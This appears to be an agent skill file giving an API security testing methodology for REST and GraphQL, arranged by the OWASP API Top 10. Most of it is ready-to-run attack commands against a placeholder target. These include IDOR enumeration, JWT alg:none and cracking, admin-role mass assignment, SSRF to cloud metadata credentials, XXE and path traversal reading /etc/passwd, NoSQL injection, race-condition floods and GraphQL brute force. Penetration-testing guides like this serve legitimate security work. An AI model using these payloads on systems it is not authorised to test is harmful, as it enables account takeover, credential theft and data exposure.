---
name: api-testing
description: REST/GraphQL API security testing covering OWASP API Top 10, BOLA, mass assignment, versioning bypass, and auth flaws
---

# API Security Testing

Modern APIs are the primary attack surface. They often lack the hardened defenses of web frontends, expose raw business logic, and are poorly monitored. Focus on authorization, data exposure, and logic before fuzzing.

## Reconnaissance

### Discover API Endpoints

    # Crawl with katana (JS-aware)
    katana -u https://target.com -d 5 -jc -aff -o output/katana_urls.txt

    # Find API paths from JS bundles
    grep -rE '"(/api|/v[0-9]|/graphql|/rest|/gql)' output/katana_urls.txt

    # Wayback + filtering
    waybackurls target.com | grep -E '/api|/v[0-9]+' | sort -u

    # Directory brute-force on common API paths
    ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,204,301,302,401,403

    # Parameter discovery
    arjun -u https://target.com/api/users -oJ output/arjun_params.json

### Version Discovery

    # Common versioning patterns to fuzz
    ffuf -u https://target.com/FUZZ/users -w <(echo -e "v1\nv2\nv3\nv4\napi\napi/v1\napi/v2\napi/v3\nrest\nrest/v1") -mc 200,401,403

    # Check HTTP headers for version hints
    curl -sI https://target.com/api/users | grep -iE "version|api-version|x-api"

### Swagger / OpenAPI Discovery

    # Common spec paths
    ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\ndocs\nredoc\nv1/swagger.json\napi/swagger") -mc 200

    # Convert to request list
    python3 -c "
    import json, sys
    spec = json.load(open('swagger.json'))
    for path in spec['paths']:
        print(path)
    "

---

## OWASP API Top 10

### API1 — Broken Object Level Authorization (BOLA/IDOR)

The most common and highest impact API vulnerability. Change object IDs in every request.

    # Numeric ID enumeration
    ffuf -u https://target.com/api/users/FUZZ/profile -w <(seq 1 10000 | tr '\n' '\n') -H "Authorization: Bearer <token>" -mc 200

    # UUID enumeration (use known UUIDs as wordlist)
    # After auth as userA, access userB's resources using their ID

    # Check all HTTP methods on same endpoint
    for method in GET POST PUT PATCH DELETE; do
        curl -s -X $method https://target.com/api/users/1337 -H "Authorization: Bearer <token>" -w "\n%{http_code}\n"
    done

    # Test indirect references
    # /api/orders/my-order → change to /api/orders/<other_order_id>
    # /api/files/download?name=myfile → change to ../etc/passwd or other user's file

Detection signals: different response size/content, 200 where 403 expected.

### API2 — Broken Authentication

    # Test JWT weaknesses
    python3 /home/pentester/tools/jwt_tool/jwt_tool.py <token> -T  # tamper modes
    python3 /home/pentester/tools/jwt_tool/jwt_tool.py <token> -X a  # alg:none
    python3 /home/pentester/tools/jwt_tool/jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt  # crack

    # Check if token accepted without signature
    # Modify payload, set "alg":"none", remove signature

    # Test API key rotation — if old key still works after rotation:
    curl -H "X-API-Key: <old_key>" https://target.com/api/profile

### API3 — Broken Object Property Level Authorization (Mass Assignment)

    # Test by sending extra fields not shown in docs
    curl -X PUT https://target.com/api/users/me \
      -H "Authorization: Bearer <token>" \
      -H "Content-Type: application/json" \
      -d '{"name":"test","role":"admin","is_admin":true,"balance":999999,"verified":true}'

    # Registration endpoint — try to set role/admin flag
    curl -X POST https://target.com/api/register \
      -d '{"username":"x","password":"x","email":"x@x.com","role":"admin","is_admin":true}'

    # Check nested objects
    curl -X PATCH https://target.com/api/profile \
      -d '{"profile":{"name":"x"},"subscription":{"plan":"enterprise"}}'

### API4 — Unrestricted Resource Consumption

    # Rate limiting test
    for i in $(seq 1 100); do
        curl -s -o /dev/null -w "%{http_code}\n" https://target.com/api/login \
          -X POST -d '{"user":"admin","pass":"test"}' &
    done

    # Test large payload handling
    python3 -c "print('A'*10000000)" | curl -X POST https://target.com/api/upload -d @-

### API5 — Broken Function Level Authorization (BFLA)

    # Test admin endpoints as regular user
    curl -H "Authorization: Bearer <user_token>" https://target.com/api/admin/users
    curl -H "Authorization: Bearer <user_token>" -X DELETE https://target.com/api/admin/users/1

    # Method escalation: GET allowed, but POST/PUT/DELETE as user?
    curl -X PUT https://target.com/api/users/1 \
      -H "Authorization: Bearer <user_token>" \
      -d '{"role":"admin"}'

    # Path case variation
    curl https://target.com/API/admin/users
    curl https://target.com/api/Admin/users

### API6 — Unrestricted Access to Sensitive Business Flows

    # Test business logic: buy item at lower price
    # Add discount via mass assignment
    curl -X POST https://target.com/api/orders \
      -d '{"item_id":1,"quantity":1,"discount":100,"price":0}'

    # Negative quantity / negative price
    curl -X POST https://target.com/api/cart/add \
      -d '{"product_id":1,"quantity":-100}'

    # Race condition on one-time-use voucher
    # Send 50 concurrent requests to use same voucher
    seq 50 | xargs -P 50 -I{} curl -X POST https://target.com/api/voucher/redeem \
      -d '{"code":"PROMO50"}' -H "Authorization: Bearer <token>"

### API7 — Server Side Request Forgery

    # Find webhook/URL params
    curl -X POST https://target.com/api/webhooks \
      -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

    # Import/export features
    curl -X POST https://target.com/api/import \
      -d '{"source":"http://internal-service:8080/admin"}'

### API8 — Security Misconfiguration

    # HTTP methods allowed on endpoints
    curl -X OPTIONS https://target.com/api/ -v

    # Debug endpoints
    ffuf -u https://target.com/FUZZ -w <(echo -e "debug\nhealth\nstatus\nmetrics\nenv\nconfig\ninfo\n_debug\n.well-known") -mc 200

    # CORS misconfiguration
    curl -H "Origin: https://evil.com" https://target.com/api/user -v | grep -i "access-control"

### API9 — Improper Inventory Management (Versioning Bypass)

Old API versions often lack new security controls. Always test older versions.

    # If v2 enforces auth but v1 doesn't:
    curl https://target.com/api/v1/users  # no auth
    curl https://target.com/api/v2/users  # 401

    # Mobile vs web API differences
    curl -A "Dalvik/2.1.0 (Linux; U; Android 11)" https://target.com/api/users
    curl -A "Mozilla/5.0" https://target.com/api/users

    # Dev/staging endpoints still accessible
    ffuf -u https://target.com/FUZZ/api/users -w <(echo -e "dev\ntest\nstaging\nbeta\nold\nlegacy\ninternal")

### API10 — Unsafe Consumption of APIs

Test third-party integrations the app trusts without validation.

---

## Advanced API Attacks

### HTTP Method Override

    # Some APIs honor X-HTTP-Method-Override
    curl -X POST https://target.com/api/users/1 \
      -H "X-HTTP-Method-Override: DELETE" \
      -H "Authorization: Bearer <user_token>"

    curl -X POST https://target.com/api/users/1 \
      -H "X-Method-Override: PUT" \
      -d '{"role":"admin"}'

### Parameter Pollution

    # Duplicate parameters — backend may take last or first
    curl "https://target.com/api/users?id=1&id=2"
    curl -X POST https://target.com/api/users -d "id=1&id=9999"

    # Array/object injection
    curl "https://target.com/api/users?id[]=1&id[]=2"
    curl -X POST https://target.com/api/search -d '{"q":{"$gt":""}}'  # NoSQL injection via JSON

### Content-Type Switching

    # Server may parse differently depending on Content-Type
    curl -X POST https://target.com/api/users \
      -H "Content-Type: application/xml" \
      -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

    # JSON to form-data switch
    curl -X POST https://target.com/api/users \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "role=admin&is_admin=1"

### GraphQL Specific

    # Introspection
    curl -X POST https://target.com/graphql \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { types { name fields { name } } } }"}'

    # Disable introspection bypass
    curl -X POST https://target.com/graphql \
      -d '{"query":"{ __schema\n{ types { name } } }"}'

    # Batch query attack (rate limit bypass)
    curl -X POST https://target.com/graphql \
      -d '[{"query":"mutation { login(user:\"admin\",pass:\"pass1\") }"},{"query":"mutation { login(user:\"admin\",pass:\"pass2\") }"}]'

    # Alias enumeration
    curl -X POST https://target.com/graphql \
      -d '{"query":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} }"}'

    # Field suggestions reveal valid fields
    curl -X POST https://target.com/graphql \
      -d '{"query":"{ user { passwordd } }"}'
    # Error: "Did you mean password?"

---

## Automation

    # nuclei API templates
    nuclei -u https://target.com -t /home/pentester/nuclei-templates/exposures/apis/ -o output/nuclei_api.txt

    # Custom ffuf wordlist for API testing
    ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
      -H "Authorization: Bearer <token>" -mc all -fc 404 -o output/api_fuzz.json

    # arjun for hidden parameters
    arjun -u https://target.com/api/users -oJ output/params.json --include '{"headers":{"Authorization":"Bearer <token>"}}'

---

## Pro Tips

1. Always compare responses between authenticated user and unauthenticated — diff reveals BOLA
2. Swagger/OpenAPI specs expose the full attack surface — find them before manual testing
3. Old API versions (v1 while app uses v3) almost always lack newer security controls
4. Test every parameter for mass assignment: send extra fields and check if they're reflected in GET
5. GraphQL introspection reveals the full schema — even if disabled, try field suggestions and aliases
6. Check mobile apps for hardcoded API keys and alternate endpoints
7. Race conditions on financial/voucher/limit endpoints are high impact — use parallel requests
8. Header injection: X-Original-URL, X-Rewrite-URL, X-Forwarded-For can bypass IP-based rate limits

## Summary

API security is authorization testing. Every endpoint should be tested with: wrong user's ID, extra fields (mass assignment), all HTTP methods, older API versions, and without authentication. Logic > fuzzing.
